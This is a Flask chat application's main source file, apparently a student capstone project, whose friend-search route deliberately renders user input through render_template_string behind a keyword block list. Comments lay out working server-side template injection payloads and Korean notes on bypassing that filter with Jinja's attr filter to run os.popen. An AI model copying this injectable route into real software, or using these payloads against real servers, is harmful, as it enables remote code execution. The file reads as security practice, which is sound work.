from flask import Flask, jsonify, request, g, session, redirect, render_template, render_template_string
from flask_socketio import SocketIO
from repository.user import UserRepository
from repository.friend import FriendRepository
from repository.chat import ChatRepository
from psycopg2.pool import SimpleConnectionPool

from datetime import datetime
import pytz

app = Flask(__name__)
app.debug = True
app.connectionPool = SimpleConnectionPool(1, 10, dbname='capstonechat', user='postgres', password='ItsSecret', host='ItsSecret', port='ItsSecret')
app.userRepository = UserRepository(); app.userRepository.setConnPool(app.connectionPool)
app.friendRepository = FriendRepository(); app.friendRepository.setConnPool(app.connectionPool)
app.chatRepository = ChatRepository(); app.chatRepository.setConnPool(app.connectionPool)
app.socketIdMemory = {}
app.secret_key = "capstone_Project"

socketio = SocketIO(app)

from controller import user
app.register_blueprint(user.bp)


    

@app.route('/')
def main_page():
    if 'id' not in session:
        return redirect('/page/login')

    userId = session['id']
    userInfo = app.userRepository.getUserInfo(userId)
    # userInfo[0]: user id
    # userInfo[1]: user name
    # userInfo[2]: user status message
    # userInfo[3]: user image 
    # userInfo[4]: hash_tag
    return render_template('main.html', user_id= userInfo[0], user_name=userInfo[1], user_status_msg=userInfo[2], user_img=userInfo[3], hash_tag=userInfo[4], uid=userInfo[5])

@app.route('/page/login')
def loginPage():
    if 'id' in session:
        return redirect('/')

    return render_template('login.html')

@app.route('/page/join')
def joinPage():
    if 'id' in session:
        return redirect('/')

    return render_template('join.html')

@app.route('/friend/request', methods=["POST"])
def requestFriend():
    params = request.get_json()
    sender, receiver = params['sender'], params['receiver']
    if sender == receiver:
        return jsonify({
            "status": 400,
            "msg": "The sender and receiver uids are the same"
        })

    r = app.friendRepository.createRequest(sender, receiver)
    if r is True:
        return jsonify({
            "status": 200,
            "msg": "success"
        })
    else:
        return jsonify({
            "status": r[0],
            "msg": r[1]
        })

@app.route('/friend/request/<uid>')
def getRequestFriend(uid):
    r = app.friendRepository.getRequestByUid(uid)
    print(r)
    if r:
        return jsonify(r)
    else:
        print(r)
        return jsonify({
            "status": 200,
            "msg": "no Request"
        })


@app.route('/friend/<uid>')
def getAllFriends(uid):
    if 'id' not in session:
        return "권한이 없네용~"

    r = app.friendRepository.getAllFriends(uid)
    if r:
        return jsonify(r)
    else:
        return jsonify({
            "msg": "fail"
        })

@app.route('/friend/request/accept/<rid>')
def acceptRequest(rid):
    if 'id' not in session:
        return redirect('/')

    requestInfo = app.friendRepository.getRequestByRid(rid)
    r = app.friendRepository.createFriendship(rid)

    if r == True:
        userInfo = app.userRepository.getUserInfoByUid(requestInfo[0][0])
        if userInfo[0] in app.socketIdMemory:
            socketio.emit('friend_update', "execute load API", to=app.socketIdMemory[userInfo[0]])
        socketio.emit('friend_update', "execute load API", to=app.socketIdMemory[session['id']])

        return jsonify({
            "msg": "success"
        })
    
    else:
        return jsonify({
            "msg": "fail"
        })

@app.route('/chat/send', methods=["POST"])
def sendChat():
    if 'id' not in session:
        return jsonify({
            "status": 403,
            "msg": "권한이 없습니다."
        })
    params = request.get_json()
    senderHash, receiverHash, message = params['sender_hash'], params['receiver_hash'], params['message']
    qr = app.chatRepository.createNewMessage(senderHash, receiverHash, message)
    receiverInfo = app.userRepository.getUserInfoByHash(receiverHash)
    senderInfo = app.userRepository.getUserInfoByHash(senderHash)


    utc = pytz.utc
    now_utc = datetime.now(utc)

    kst = pytz.timezone('Asia/Seoul')
    now_kst = now_utc.astimezone(kst)

    if(receiverInfo[0] in app.socketIdMemory):
        socketio.emit('private_message', {'sender': senderHash, 'sender_name': senderInfo[1], 'message': message, 'time': str(now_kst)}, to=app.socketIdMemory[receiverInfo[0]])

    socketio.emit('private_message', {'sender': senderHash, 'sender_name': senderInfo[1], 'receiver': receiverHash, 'time':str(now_kst), 'message': message}, to=app.socketIdMemory[session['id']])
    if(qr):
        return jsonify({
            "msg": "success"
        })
    else:
        return jsonify({
            "msg": "fail"
        })

### SSTI ROUTER

filtering = ["os", "sys", "pwd", "__", 'popen', 'class']

# "".__class__.__base__.__subclasses__()[127].__init__.__globals__['sys'].modules['os'].popen('pwd').read()
# {{""|attr(request.form.get('cls'))|attr(request.form.get('base'))|attr(request.form.get('subcls'))}}
# {{""|attr(request.form.get('cls'))|attr(request.form.get('base'))|attr(request.form.get('subcls'))}}
# {{""|attr(request.form.get('cls'))|attr(request.form.get('base'))|attr(request.form.get('subcls'))|attr(request.form.get('init'))|attr(request.form.get('globals'))|attr(request.form.get('md'))|attr(request.form.get('pp'))|attr("read()")}}
# {{""|attr(request.form.get('cls'))|attr(request.form.get('base'))|attr(request.form.get('subcls'))()|attr(request.form.get('g1')(127))|attr(request.form.get('init'))|attr(request.form.get('globals'))|attr(request.form.get('g1')(request.form.get('ss')))}}


# 필터링을 우회하는 방법
# first: attr 함수 사용
'''
Jinja2 템플릿에서 사용가능한 Builtin Filter가 존재
그 중 attr 필터는 Object의 atrribute를 가져옴
즉, '.'과 같은 문자가 필터링되었을 때도 객체의 프로퍼티에 접근할 수 있음
ex) {{""|attr("__class__")}}

만약 "__class__"가 필터링 되었을 때
문자열을 쪼갠다면? 예를 들어
{{""|attr("_"+"_"+"c"+"l"+"a"+"s"+"s"+"_"+"_")}}
위와 같은 페이로드는 필터링되지 않음

request 객체 사용을 막지 않았다면 request body의 데이터를 활용해 페이로드를 인젝션할 수 있음
request.form.get과 같은 함수를 사용하여 HTTP Body로 함께 보낸 페이로드를 활용하는 방식
'''
# codecs.IncrementalEncoder
# {{""|attr(request.form.get('cls'))|attr(request.form.get('base'))|attr(request.form.get('subcls'))()|attr(request.form.get('g1'))(127)}}

# sys 모듈 접근
# {{""|attr(request.form.get('cls'))|attr(request.form.get('base'))|attr(request.form.get('subcls'))()|attr(request.form.get('g1'))(127)|attr(request.form.get('init'))|attr(request.form.get('globals'))|attr(request.form.get('g1'))(request.form.get('ss'))}}

# pwd
# {{""|attr(request.form.get('cls'))|attr(request.form.get('base'))|attr(request.form.get('subcls'))()|attr(request.form.get('g1'))(127)|attr(request.form.get('init'))|attr(request.form.get('globals'))|attr(request.form.get('g1'))(request.form.get('ss'))|attr(request.form.get('md'))|attr(request.form.get('g1'))(request.form.get('o'))|attr(request.form.get('pp'))(request.form.get('w'))|attr(request.form.get('r'))()}}

# second: 인코딩 문자 사용
'''
"_" -> %5f 와 같은 인코딩을 이용한 공격인데 나는 성공하지 못했음
웹 서버 프레임워크로 해당 인코딩 문자가 입력하면, 이미 라우터 함수에서는 일반적인 문자열로 변해있었음
즉, 필터링되었는데.. 이 방법이 가능하다는데 잘모르겠음..
'''


"""
저번에 path variable로 쿼리를 넘겼는데, query string으로 넘겨봄
"""
@app.route('/friend/search/<uid>')
def friendSearch(uid):
    query = request.args.get('query')
    print(query)
    print()

    if 1 == 1: # 필터링 로직 ON/OFF
        for i in filtering:
            if i in query:
                template = '''<p style="color: white; padding: 0px 15px 0px 15px"; class="noto-sans">서버에 의해 필터링된 요청입니다.
    </p>'''
                return render_template_string(template)

    # r = app.friendRepository.getAllFriends(uid)
    # new = []
    # for i in r:
    #     if query in i[1]:
    #         new.append(i)

    template = '''<p style="color: white; padding: 0px 15px 0px 15px"; class="noto-sans">{}에 대한 검색 결과
</p>'''.format(query)
    
    return render_template_string(template)


@app.route('/chat/get/<myHash>/<yourHash>')
def getMessages(myHash, yourHash):
    qr = app.chatRepository.getMessages(myHash, yourHash)
    return qr

@socketio.on('connect')
def handle_connect():
    app.socketIdMemory[session['id']] = request.sid
    print("Client connected", app.socketIdMemory[session['id']])

@socketio.on('disconnect')
def handle_disconnect():
    print("Client disconnected", app.socketIdMemory[session['id']])
    app.socketIdMemory.pop(session['id'])
    

if __name__ == "__main__":
    socketio.run(app, host='0.0.0.0', port=8000, debug=True)
